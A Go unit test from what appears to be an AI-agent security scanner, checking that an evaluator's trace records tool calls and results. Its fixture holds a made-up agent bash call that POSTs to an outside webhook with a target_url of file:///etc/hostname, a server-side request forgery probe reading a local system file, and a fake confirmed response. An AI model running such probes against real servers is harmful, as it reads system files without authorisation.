package evaluator

import (
	"strings"
	"testing"

	"github.com/chainreactors/aiscan/pkg/agent/provider"
)

func TestBuildTraceIncludesToolArgumentsAndResults(t *testing.T) {
	result := `{"response_body":"iZj6c9ekljm6tiex6p8lnzZ\n","response_code":200,"target_url":"file:///etc/hostname"}`
	messages := []provider.ChatMessage{
		{
			Role: "assistant",
			ToolCalls: []provider.ToolCall{{
				ID:   "call-1",
				Type: "function",
				Function: provider.FunctionCall{
					Name:      "bash",
					Arguments: `{"cmd":"curl -s -X POST https://desk.redhaze.top/api/desk/webhooks -d '{\"target_url\":\"file:///etc/hostname\"}'"}`,
				},
			}},
		},
		provider.NewToolResultMessage("call-1", result),
	}

	trace := buildTrace(messages, "confirmed", 2)

	for _, want := range []string{
		"Tool calls: 1",
		"bash id=call-1",
		"file:///etc/hostname",
		`"response_code":200`,
		`"target_url":"file:///etc/hostname"`,
		"Final output:\nconfirmed",
	} {
		if !strings.Contains(trace, want) {
			t.Fatalf("trace missing %q\ntrace:\n%s", want, trace)
		}
	}
}
